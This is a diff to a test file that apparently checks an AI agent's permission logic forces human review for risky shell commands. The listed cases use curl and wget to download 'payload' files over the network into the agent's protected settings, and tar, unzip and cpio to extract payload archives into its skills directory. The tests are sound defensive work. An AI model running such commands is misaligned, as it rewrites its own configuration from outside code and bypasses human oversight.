@@ -851,7 +851,27 @@ describe('shouldForceAutoModeReviewForAllow', () => {
   it('returns true for downloader output flags targeting protected paths', () => {
     for (const command of [
       'curl -o .qwen/settings.json https://example.com/payload',
+      'curl -o.qwen/settings.json https://example.com/payload',
       'wget -O .qwen/settings.json https://example.com/payload',
+      'wget -O.qwen/settings.json https://example.com/payload',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for archive extraction commands targeting protected dirs', () => {
+    for (const command of [
+      'tar xf payload.tar -C .qwen/skills',
+      'unzip payload.zip -d .qwen/skills',
+      'cpio -i -D .qwen/skills',
     ]) {
       expect(
         shouldForceAutoModeReviewForAllow(
